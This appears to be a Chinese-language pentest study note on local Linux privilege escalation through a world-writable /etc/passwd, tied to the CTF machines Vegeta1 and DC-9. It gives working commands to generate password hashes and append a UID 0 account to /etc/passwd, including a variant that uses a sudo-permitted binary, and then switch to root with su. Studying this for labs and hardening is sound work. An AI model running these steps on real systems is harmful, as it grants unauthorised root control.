# 💥 可寫系統密碼檔提權 (writable-etc-passwd)
本文件說明如何利用 Linux 系統中配置錯誤、對普通使用者可寫的 `/etc/passwd` 檔案進行本地特權提升（Privilege Escalation）。

## 🔍 檢測可寫密碼檔
使用以下指令檢查 `/etc/passwd` 是否對當前使用者可寫：
```bash
ls -la /etc/passwd

# 或者使用 find 指令列出系統中所有可寫檔案
find /etc -writable -type f 2>/dev/null
```
若檔案權限顯示為 `-rw-rw-rw-`（即權限為 `666`）或對 other 有寫入權限，即可進行編輯。

## 🛠️ 利用與提權步驟

### 1. 生成加密的密碼 Hash 碼
我們需要手動伪造一筆使用者記錄，其密碼需要以 Hash 格式寫入。我們可以在本地或攻擊機使用 `openssl` 或 `python` 生成：
*   **方法 A (openssl)**：
    ```bash
    # 生成密碼為 123456 的 MD5-crypt 雜湊 (使用 myroot 作為 salt)
    openssl passwd -1 -salt myroot 123456
    ```
*   **方法 B (python)**：
    ```bash
    python3 -c 'import crypt; print(crypt.crypt("123456", "$6$mysalt"))'
    ```

### 2. 追加特權使用者至 `/etc/passwd`
向 `/etc/passwd` 尾端寫入一筆具備 root 權限（UID: 0, GID: 0）的自定義使用者（如 `newroot`）：
```bash
echo "newroot:<PASSWORD_HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd
```
*   *注意：如果直接在 shell 命令列中使用 echo，Hash 中的 `$` 符號需要使用 `\` 轉義（寫成 `\$`），否則會被解析為環境變數。*

*   **變體利用 (利用具備寫入/追加權限的 Sudo 二進制檔)**：
    有時 `/etc/passwd` 對當前使用者不可寫，但我們被允許透過 `sudo` 執行某個客製化的二進制程式，且該程式的功能是將特定檔案的內容「追加寫入」到另一個指定檔案中。
    1.  建立一個包含偽造使用者資料的臨時檔案 `/tmp/add-me`：
        ```bash
        echo "newroot:<PASSWORD_HASH>:0:0:root:/root:/bin/bash" > /tmp/add-me
        ```
    2.  藉由該 Sudo 二進制程式將臨時檔案追加至 `/etc/passwd` 中：
        ```bash
        sudo /opt/devstuff/dist/test/test /tmp/add-me /etc/passwd
        ```

### 3. 切換帳號取得 Root 權限
```bash
su newroot
# 輸入您設定的密碼 (如 123456)
```
成功登入後，執行 `whoami` 確認已順利取得 `root` 權限。

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Vegeta1]]（利用 /etc/passwd 對 all users 可寫 the 漏洞，追加 `newroot` 使用者完成提權）。
    *   [[DC-9]]（利用使用者 `fredf` 擁有的 sudo 權限執行客製化二進制檔案 `/opt/devstuff/dist/test/test`，該程式能以 root 權限將任意檔案內容追加寫入另一個檔案，藉此將偽造的特權使用者紀錄追加寫入到 `/etc/passwd` 中取得 root 權限）。
